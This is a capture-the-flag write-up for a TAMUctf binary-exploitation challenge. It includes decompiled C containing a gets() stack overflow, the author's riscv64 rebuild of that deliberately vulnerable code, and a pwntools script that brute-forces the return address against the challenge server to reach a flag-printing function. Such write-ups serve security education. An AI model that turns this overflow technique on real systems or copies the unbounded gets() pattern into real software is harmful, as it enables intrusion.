# meet-me-under-the-arch

## Description

The people who wrote this binary are simply mocking us with the simplicity of the vulnerability present
in this binary, but we can't exploit the remote! It seems to be running riscv64 instead.

Can you exploit the remote based off the vulnerability present in this binary?

```nc challenges.tamuctf.com 7238```

## Solution

tl;dr: reverse the binary into c, compile your own binary for riscv64 so you can get the general print_flag_debug location, and then brute force that area of the binary until your exploit works. 

### initial review

#### main

```c
undefined8 main(void)

{
  taunt();
  return 0;
}
```

#### taunt

```c
void taunt(void)

{
  uint uVar1;
  
  printf("Flag\'s here: %p\nCome and get it!\n",flag);
  uVar1 = fflush(stdout);
  vuln((ulonglong)uVar1);
  return;
}
```

#### vuln

```c
void vuln(void)

{
  char acStack69 [53];
  
  gets(acStack69);
  return;
}
```

#### print_flag_debug

```c
ulonglong print_flag_debug(void)

{
  uint uVar1;
  
  printf("Okay, so you really need the flag. Here it is: %s\n",flag);
  uVar1 = fflush(stdout);
  return (ulonglong)uVar1;
}
```

The flow of this exploit is pretty straightforward.  We have an unbounded buffer overflow via gets and a function that prints the flag when called.  If the server were running the aarch64 binary we were provided the challenge would basically be done.  Instead, we need to figure out the address of the function when compiled for a riscv64 target.  

### creating a local riscv64 binary

I opened up the provided aarch64 binary in Ghidra and pretty much copy pasted the function decompilations into another file with minor changes to make it compile.  

```c
#include <stdlib.h>
#include <stdio.h>
char* flag = "gigem{howdy!}";


void print_flag_debug() {  
  printf("Okay, so you really need the flag. Here it is: %s\n",flag);
  fflush(stdout);
}

void vuln(void) {
  char acStack69 [53];  
  gets(acStack69);
}


void taunt() {
  printf("Flag\'s here: %p\nCome and get it!\n",flag);
  fflush(0);
  vuln();
}

int main() {
	taunt();
}
```
Once you have the C code for it, you just need to compile it into riscv64 instructions.  The provided aarch64 binary used clang (which could be found via strings) and so I did also. If you don't already have it, you'll need to install the riscv64 gcc toolchain to compile to it.  

`clang --target=riscv64-linux-gnu meet-me-under-the-arch.c  -o meet-me-under-the-arch.riscv64 -nopie -fno-stack-protector -v`


The address of the print_flag_debug function on my compiled copy is 0x10558.  To allow for some differences in the compilation we'll start a little bit below that and iterate up from there until we get the flag.  

### exploiting the server


```python
from pwn import *
import re
import sys
import time
context.terminal = ['termite','-e']

e = ELF("./meet-me-under-the-arch.riscv64")

base = 0x10500 # 0x58 below the address of print_flag_debug in my compiled copy


payload = b"B" * 61
index = 0

while True:
	p = remote("34.123.13.72", 7238)
	print("Trying addr: ", hex(base))
	target = int(re.search("^Flag's here: (.*?)$",p.readline().decode("utf-8") ).group(1),16)
	p.sendline(payload + p64(base, endian=e.endian))
	time.sleep(.5) # this delay is important because otherwise receiving the flag is inconsistent
	p.recv(256)

	try:
		if p.can_recv():
			maybe_flag = p.recv(256).decode("utf-8")
			match = re.search("gigem{.*?}", maybe_flag)
			if match is not None:
				print(match.group(0))
				sys.exit()
	except EOFError:
		pass
	p.close()
	base += 1
```

```text
❯ python solver.py SILENT=1
Trying addr:  0x10558
Trying addr:  0x10559
Trying addr:  0x1055a
Trying addr:  0x1055b
Trying addr:  0x1055c
Trying addr:  0x1055d
...
Trying addr:  0x1059c
Trying addr:  0x1059d
Trying addr:  0x1059e
gigem{just_a_touch_of_je_ne_sais_quoi}
```